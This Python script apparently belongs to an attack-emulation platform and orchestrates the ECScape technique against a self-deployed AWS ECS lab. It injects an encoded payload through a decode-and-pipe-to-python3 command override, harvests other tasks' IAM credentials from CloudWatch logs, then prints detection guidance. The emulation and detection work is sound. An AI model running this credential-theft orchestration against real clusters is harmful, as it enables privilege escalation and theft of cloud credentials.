"""
Technique : aws.credential-access.ecscape  (ECScape)
Tactic    : Credential Access / Privilege Escalation
MITRE     : T1552.007 (Unsecured Credentials: Container API),
            T1552.005 (Cloud Instance Metadata API)
Source    : https://github.com/naorhaziz/ecscape
            https://www.sweet.security/blog/ecscape-understanding-iam-privilege-boundaries-in-amazon-ecs

What this does
--------------
ECScape breaks ECS task isolation: a low-privileged task on an EC2 container
instance impersonates the ECS agent and harvests the IAM credentials of every
*other* task on the same host.

This orchestrator (backend entry `run(outputs, region)`):
  1. waits for the container instance to register and the victim tasks to run,
  2. RunTask-launches an attacker task whose task role is DENY-ALL, injecting the
     ECScape Python payload (emulation_scripts/ecscape_payload.py) as a base64
     command override — the container installs deps and executes it in-place,
  3. reads the harvested credentials back out of the attacker container's
     CloudWatch logs, and reports the cross-task credential theft.

The escalation is proven by the delta: a task whose own role can do *nothing*
walks away holding the s3-control task role and the secret-execution role.

Standalone:  run `pulumi up` in ../infra/, then `python attack.py`
Backend:     tasks.py imports and calls `run(stack.outputs, region=stack.region)`
"""
from __future__ import annotations

import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import base64
import gzip
import json
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError

PAYLOAD_FILE = Path(__file__).parent / "ecscape_payload.py"
# ECS RunTask overrides are capped at 8192 bytes total. We gzip+base64 the
# payload to fit; this guard fails loudly (not with a cryptic ECS error) if a
# future edit to the payload would breach the cap.
OVERRIDES_SAFE_LIMIT = 7600

CONTAINER_INSTANCE_TIMEOUT_S = 300   # ASG launch + ECS agent registration
VICTIM_TASKS_TIMEOUT_S = 300         # victim services reach RUNNING
ATTACK_TIMEOUT_S = 300               # pip install + ACS harvest inside the container
RESULT_BEGIN, RESULT_END = "ECSCAPE_RESULT_BEGIN", "ECSCAPE_RESULT_END"


def banner(msg: str) -> None:
    print(f"\n{'=' * 64}\n  {msg}\n{'=' * 64}")


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack's control-plane calls. In the MayaTrail backend the
    worker injects the tenant's short-lived assumed-role credentials as
    outputs['_aws_credentials']; use them so the attack (ecs:RunTask etc.) runs
    in the tenant account. Falls back to the ambient default session for
    standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


# ── Readiness waits ─────────────────────────────────────────────────────────
def wait_for_container_instance(ecs, cluster: str, timeout_s: int) -> str | None:
    print(f"  Waiting up to {timeout_s}s for a container instance to register in '{cluster}'...")
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            arns = ecs.list_container_instances(cluster=cluster, status="ACTIVE").get("containerInstanceArns", [])
            if arns:
                desc = ecs.describe_container_instances(cluster=cluster, containerInstances=arns)
                for ci in desc.get("containerInstances", []):
                    if ci.get("agentConnected") and ci.get("status") == "ACTIVE":
                        print(f"  [+] Container instance ACTIVE: {ci['containerInstanceArn'].split('/')[-1]}")
                        return ci["containerInstanceArn"]
        except ClientError as exc:
            print(f"  [~] {exc.response['Error']['Code']} — retrying...")
        time.sleep(10)
    print("  [!] Timed out waiting for a container instance.")
    return None


def wait_for_victim_tasks(ecs, cluster: str, want: int, timeout_s: int) -> int:
    print(f"  Waiting up to {timeout_s}s for >= {want} victim tasks to reach RUNNING...")
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        running = ecs.list_tasks(cluster=cluster, desiredStatus="RUNNING").get("taskArns", [])
        if len(running) >= want:
            print(f"  [+] {len(running)} tasks RUNNING on the host.")
            return len(running)
        time.sleep(10)
    running = ecs.list_tasks(cluster=cluster, desiredStatus="RUNNING").get("taskArns", [])
    print(f"  [~] Proceeding with {len(running)} running task(s).")
    return len(running)


# ── Attacker task ────────────────────────────────────────────────────────────
def launch_attacker(ecs, outputs: dict) -> str | None:
    payload_b64 = base64.b64encode(gzip.compress(PAYLOAD_FILE.read_bytes(), 9)).decode()
    if len(payload_b64) > OVERRIDES_SAFE_LIMIT:
        raise RuntimeError(
            f"encoded payload {len(payload_b64)}B exceeds RunTask overrides budget "
            f"({OVERRIDES_SAFE_LIMIT}B) — move it to the task-def command or an S3 object."
        )
    # Install runtime deps then decode+decompress+exec the payload in-container.
    command = [
        "sh", "-c",
        "pip install --quiet --no-cache-dir boto3 websocket-client requests >/dev/null 2>&1; "
        'printf "%s" "$ECSCAPE_PAYLOAD_B64" | base64 -d | gzip -d | python3 -',
    ]
    overrides = {
        "containerOverrides": [{
            "name": outputs["attacker_container_name"],
            "command": command,
            "environment": [{"name": "ECSCAPE_PAYLOAD_B64", "value": payload_b64}],
        }]
    }
    try:
        resp = ecs.run_task(
            cluster=outputs["cluster_name"],
            taskDefinition=outputs["attacker_task_family"],
            launchType="EC2",
            count=1,
            overrides=overrides,
            startedBy="ecscape-emulation",
        )
    except ClientError as exc:
        print(f"  [!] RunTask failed: {exc}")
        return None
    failures = resp.get("failures") or []
    if failures:
        print(f"  [!] RunTask placement failure: {failures}")
        return None
    task_arn = resp["tasks"][0]["taskArn"]
    print(f"  [+] Attacker task launched: {task_arn.split('/')[-1]}")
    print("  [!] CloudTrail event: ecs:RunTask (deny-all task role)")
    return task_arn


def wait_task_stopped(ecs, cluster: str, task_arn: str, timeout_s: int) -> None:
    print(f"  Waiting up to {timeout_s}s for the attacker task to finish...")
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        desc = ecs.describe_tasks(cluster=cluster, tasks=[task_arn])
        tasks = desc.get("tasks", [])
        if tasks:
            status = tasks[0].get("lastStatus")
            if status == "STOPPED":
                reason = tasks[0].get("stoppedReason", "")
                print(f"  [+] Attacker task STOPPED ({reason})")
                return
            print(f"  [~] Task status: {status} ...")
        time.sleep(10)
    print("  [!] Timed out waiting for the attacker task to stop.")


def read_attacker_result(logs, log_group: str, container: str, task_arn: str) -> dict | None:
    task_id = task_arn.split("/")[-1]
    stream = f"attacker/{container}/{task_id}"   # awslogs stream-prefix/container/task-id
    print(f"  Reading harvest from log stream: {stream}")
    text = ""
    for _ in range(12):  # logs can lag a few seconds after the task stops
        try:
            events = logs.get_log_events(
                logGroupName=log_group, logStreamName=stream, startFromHead=True,
            ).get("events", [])
            text = "\n".join(e["message"] for e in events)
            if RESULT_BEGIN in text and RESULT_END in text:
                break
        except ClientError as exc:
            if exc.response["Error"]["Code"] != "ResourceNotFoundException":
                print(f"  [~] get_log_events: {exc.response['Error']['Code']}")
        time.sleep(5)
    if text:
        print("  ---- attacker container output ----")
        for line in text.splitlines():
            if RESULT_BEGIN not in line:
                print(f"    {line}")
    if RESULT_BEGIN in text and RESULT_END in text:
        blob = text.split(RESULT_BEGIN, 1)[1].split(RESULT_END, 1)[0]
        try:
            return json.loads(blob)
        except ValueError:
            return None
    return None


# ── Entry point ──────────────────────────────────────────────────────────────
def run(outputs: dict, region: str = "us-east-1") -> dict:
    region = region or outputs.get("region") or "us-east-1"
    cluster = outputs.get("cluster_name")
    if not cluster:
        print("[!] cluster_name missing from outputs — did `pulumi up` succeed?")
        return {"status": "error", "reason": "missing outputs"}

    session = _bootstrap_session(outputs, region)
    ecs = session.client("ecs")
    logs = session.client("logs")

    summary: dict = {"status": "pending", "harvested": []}
    task_arn = None
    try:
        banner("Step 1 — Wait for the ECS container instance")
        if not wait_for_container_instance(ecs, cluster, CONTAINER_INSTANCE_TIMEOUT_S):
            summary["status"] = "error"
            summary["reason"] = "no container instance"
            return summary

        banner("Step 2 — Wait for victim tasks (the loot) to run")
        # 2 victims (s3-control + database); attacker is launched next.
        wait_for_victim_tasks(ecs, cluster, want=2, timeout_s=VICTIM_TASKS_TIMEOUT_S)

        banner("Step 3 — Launch DENY-ALL attacker task (ECScape payload)")
        task_arn = launch_attacker(ecs, outputs)
        if not task_arn:
            summary["status"] = "fail_attack"
            summary["reason"] = "attacker task did not launch"
            return summary

        banner("Step 4 — Let the payload impersonate the agent + harvest creds")
        wait_task_stopped(ecs, cluster, task_arn, ATTACK_TIMEOUT_S)

        banner("Step 5 — Recover harvested credentials from the attacker logs")
        result = read_attacker_result(
            logs, outputs["attacker_log_group"], outputs["attacker_container_name"], task_arn,
        )
        if not result:
            print("  [~] No structured result recovered (see container output above).")
            summary["status"] = "warn_no_result"
            return summary

        harvested = result.get("credentials", [])
        summary["harvested"] = harvested
        summary["status"] = "pass" if result.get("ok") else "warn_no_creds"

        banner("Result — cross-task credential theft")
        attacker_role = outputs.get("attacker_role_arn", "<deny-all>")
        print(f"  Attacker task role (own permissions): {attacker_role}  ->  DENY ALL")
        if harvested:
            print(f"  [+] Stole {len(harvested)} credential set(s) from OTHER tasks on the host:")
            for c in harvested:
                print(f"      - {c.get('role_type'):9s} {c.get('role_arn')}  (AKID {c.get('access_key_id')})")
            print("  [!] A zero-permission task now holds other tasks' roles — task isolation broken.")
        else:
            print("  [~] Payload connected but harvested no credentials "
                  "(check that victim tasks were RUNNING on the same host).")
    except Exception as exc:  # noqa: BLE001
        summary["status"] = "error"
        summary["reason"] = f"{type(exc).__name__}: {exc}"
        print(f"[!] {summary['reason']}")
    finally:
        # Don't leave a RUNNING attacker task to block `pulumi destroy`.
        if task_arn:
            try:
                cur = ecs.describe_tasks(cluster=cluster, tasks=[task_arn]).get("tasks", [])
                if cur and cur[0].get("lastStatus") not in ("STOPPED", "DEPROVISIONING"):
                    ecs.stop_task(cluster=cluster, task=task_arn, reason="ecscape-emulation cleanup")
                    print("  [i] Stopped lingering attacker task.")
            except ClientError:
                pass

    banner("Detection guidance")
    print("  * ecs:DiscoverPollEndpoint called with the EC2 *instance* role (not the agent) — anomalous.")
    print("  * A SigV4-signed ACS WebSocket (service 'ecs') opened by instance-role credentials.")
    print("  * ecs:RunTask launching a task whose task role is deny-all / unexpected.")
    print("  * Task-role credentials used from an IP/task other than the task they belong to.")
    print("\n  Run `pulumi destroy` in ../infra/ to tear down the cluster.")
    return summary


# ── Standalone runner (atomic mode; benign for the backend, which imports run) ─
if __name__ == "__main__":
    import os
    import subprocess

    infra_dir = str(Path(__file__).parent.parent / "infra")
    env = {**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")}
    proc = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=infra_dir, capture_output=True, text=True, env=env,
    )
    outs = json.loads(proc.stdout) if proc.returncode == 0 else {}
    if not outs:
        print("[!] No Pulumi outputs — run `pulumi up` in ../infra/ first.")
        sys.exit(1)
    run(outs, outs.get("region", os.environ.get("AWS_REGION", "us-east-1")))
